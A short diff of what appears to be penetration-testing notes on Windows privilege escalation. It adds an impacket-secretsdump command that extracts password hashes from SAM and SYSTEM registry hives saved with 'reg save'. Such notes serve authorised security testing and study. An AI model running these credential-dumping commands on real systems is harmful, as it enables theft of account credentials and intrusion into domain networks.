@@ -26,6 +26,8 @@ net localgroup Administrators
 ```powershell
 reg save HKLM\SAM C:\Tools\sam.hiv
 reg save HKLM\SYSTEM C:\Tools\system.hiv
+
+impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
 ```
 
 # Confirming Local Admin Access on Domain Controller
